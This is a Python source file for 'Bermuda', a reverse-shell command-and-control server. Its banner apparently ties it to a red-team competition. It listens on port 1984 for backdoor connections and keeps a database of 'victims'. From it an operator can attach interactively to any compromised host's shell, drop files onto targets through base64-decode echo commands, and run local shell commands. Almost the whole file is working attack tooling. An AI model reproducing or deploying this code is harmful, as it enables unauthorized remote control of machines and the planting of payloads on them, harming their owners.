import argparse
import sqlalchemy as db
import signal
from termcolor import colored
import asyncio
import daemon.pidfile
import daemon
import time
import os
import aiochannel
import subprocess
import aioconsole
from typing import Optional
import base64  
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 1984
BUFFER_SIZE = 16384



engine = None
metadata = None
conn = None

class ReverseShellManager:
    def __init__(self):
        self.backdoors = {}
    def list_backdoors(self):
        return list(self.backdoors.keys())
    async def read(self, backdoor)-> Optional[bytes]:
        if backdoor not in self.backdoors:
            return None
        #check if the backdoor is still connected
        if self.backdoors[backdoor][0].at_eof():
            #prune the backdoor
            del self.backdoors[backdoor]
            return None
        #read the data
        return await self.backdoors[backdoor][0].read(BUFFER_SIZE)
    async def upload(self, backdoor, filename):
        if backdoor not in self.backdoors:
            return False
        #check if the backdoor is still connected
        if self.backdoors[backdoor][1].is_closing():
            #prune the backdoor
            del self.backdoors[backdoor]
            return False
        #open the file
        try:
            with open(filename, 'rb') as f:
                #read the file
                data = f.read()
                #encode the file to base64
                data = base64.b64encode(data)
                #echo the file to the backdoor with a base64 decode command
                self.backdoors[backdoor][1].write(f"echo {data.decode()} | base64 -d > {filename}\n".encode())
                await self.backdoors[backdoor][1].drain()
                return True
        except Exception as e:
            print(f"Error uploading file: {e}")
            return False
    async def write(self, backdoor, data) -> bool:
        if backdoor not in self.backdoors:
            return False
        #check if the backdoor is still connected
        if self.backdoors[backdoor][1].is_closing():
            #prune the backdoor
            del self.backdoors[backdoor]
            return False
        #write the data
        self.backdoors[backdoor][1].write(data)
        await self.backdoors[backdoor][1].drain()
        return True
    async def __handle_backdoor__(self, reader, writer):
        print(colored(f"New backdoor connection from {writer.get_extra_info('peername')[0]}:{writer.get_extra_info('peername')[1]}", 'green'))
        remote = writer.get_extra_info('peername')[0] + ":" + str(writer.get_extra_info('peername')[1])
        self.backdoors[remote] = (reader, writer)
        #await it closing
        await self.backdoors[remote][1].wait_closed()

def signal_handler(sig, frame):
    exit(0)
    
def list_victims(conn, victims):
    # Get the victims
    victims_query = db.select(victims)
    # Execute the query
    victims_result = conn.execute(victims_query)
    # Print the results
    print("Victims:")
    print("\tID:\tIP:\t\tComment:\t")
    print("--------------------------------------------------")
    for victim in victims_result:
        #print bullet point
        print(colored("*", 'red'), end='\t')
        print(colored(f"{victim[0]}", 'green'), end='\t')
        print(colored(f"{victim[1]}", 'blue'), end='\t')
        print(colored(f"{victim[2]}", 'yellow'))
    print("--------------------------------------------------")
def list_backdoors(rsm):
    # Get the victims
    backdoors = rsm.list_backdoors()
    # Print the results
    print("Backdoors:")
    print("\tOrigin:\t\t\t")
    print("--------------------------------------------------")
    for backdoor in backdoors:
        #print bullet point
        print(colored("*", 'red'), end='\t')
        print(colored(f"{backdoor}", 'green'))
    if len(backdoors) == 0:
        print(colored("*", 'red'), end='\t')
        print(colored("No backdoors connected", 'yellow'))
    print("--------------------------------------------------")

async def main():
    io_lock = asyncio.Lock()
    parser = argparse.ArgumentParser()
    parser.add_argument('--db', type=str, default='./bermuda_state.db')
    parser.add_argument('--listener', type=bool, default=False)

    args = parser.parse_args()
    # Connect to the database
    engine = db.create_engine(f'sqlite:///{args.db}')
    conn = engine.connect()
    metadata = db.MetaData()
    
    victims = db.Table(
        "Victim",
        metadata,
        db.Column("id", db.Integer, primary_key=True),
        db.Column("ip", db.String),
        db.Column("comment", db.String, default="")
    )
    
    #register signal handler
    signal.signal(signal.SIGINT, signal_handler)
    # Print the banner
    colors = ['yellow', 'white', 'grey','black']
    banner = """
    __________                               .___       
\______   \ ___________  _____  __ __  __| _/____   
 |    |  _// __ \_  __ \/     \|  |  \/ __ |\__  \  
 |    |   \  ___/|  | \/  Y Y  \  |  / /_/ | / __ \_
 |______  /\___  >__|  |__|_|  /____/\____ |(____  /
        \/     \/            \/           \/     \/ 
======================================================
Go C3T, Beat Airforce
    """
    for index, c in enumerate(banner):
        print(colored(c, colors[index % len(colors)]), end='')
        
    
    # Create the tables
    metadata.create_all(engine)
    
    print(f"Connected to database located at {args.db}")
    
    rsm = ReverseShellManager()
    # Create the server
    server = await asyncio.start_server(rsm.__handle_backdoor__, SERVER_HOST, SERVER_PORT)
    await server.start_serving()
    while True:
        # Get the command
        command = ""
        async with io_lock:
            command = await aioconsole.ainput("> ")
        # split the command
        command = command.split()
        if len(command) == 0:
            continue
        elif command[0].startswith("!"):
            #run a shell command
            try:
                output = subprocess.check_output(command[0][1:] + " " + "".join(command[1:]), shell=True)
                print(output.decode())
            except Exception as e:
                print(f"Error running command: {e}")
        elif command[0] == "help":
            print("Available commands: help, exit")
        elif command[0] == "exit":
            break
        elif command[0] == "list" or command[0] == "ls" or command[0] == "show":
            list_victims(conn, victims)
        elif command[0] == "new" or command[0] == "add" or command[0] == "create":
            if len(command) < 2:
                print("Usage: new victim_ip_or_hostname [comment]")
                continue
            # Create the new victim
            comment = ""
            if len(command) > 2:
                comment = " ".join(command[2:])
            conn.execute(victims.insert().values(ip=command[1], comment=comment))
            list_victims(conn, victims)
        elif command[0] == "delete" or command[0] == "del" or command[0] == "rm":
            if len(command) < 2:
                print("Usage: delete victim_id")
                continue
            conn.execute(victims.delete().where(victims.c.id == command[1]))
            list_victims(conn, victims)
        elif command[0] == "shells" or command[0] == "backdoors":
            list_backdoors(rsm)
        elif command[0] == "interact" or command[0] == "attach" or command[0] == "connect":
            if len(command) < 2:
                print("Usage: interact (shell_ip:shell_port)") 
                continue
            if len(rsm.backdoors) == 0:
                print("No reverse shells connected")
                continue
            if command[1] not in rsm.list_backdoors():
                print("Invalid selection, pick one of the following:")
                list_backdoors(rsm)
                continue
            selection = command[1]
            async def read():
                while True:
                    read_bytes = await rsm.read(selection)
                    if read_bytes is None:
                        break
                    print("read_bytes")
                    print(read_bytes.decode(), end="")
            async def write():
                while True:
                    input_bytes = ""
                    async with io_lock:
                        input_bytes = await aioconsole.ainput(f"{selection}> ")
                    #add newline
                    input_bytes += "\n"
                    if input_bytes == "":
                        continue
                    elif input_bytes.lower().strip() == "exit":
                        print("Exiting reverse shell")
                        break
                    else:
                        await rsm.write(selection, input_bytes.encode())
            tasks = [asyncio.create_task(read()), asyncio.create_task(write())]
            #wait for first task to finis
            done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            #cancel the other task
            for task in pending:
                task.cancel()
        elif command[0] == "upload":
            if len(command) < 3:
                print("Usage: upload (shell_ip:shell_port) (filename)")
                continue
            if len(rsm.backdoors) == 0:
                print("No reverse shells connected")
                continue
            if command[1] not in rsm.list_backdoors():
                print("Invalid selection, pick one of the following:")
                list_backdoors(rsm)
                continue
            selection = command[1]
            if not await rsm.upload(selection, command[2]):
                print("Error uploading file")
            else:
                print("File uploaded successfully")
        else:
            print(f"Unknown command {command[0]}")
        #commit changes
        conn.commit()
    conn.close()
    
if __name__ == "__main__":
    asyncio.run(main())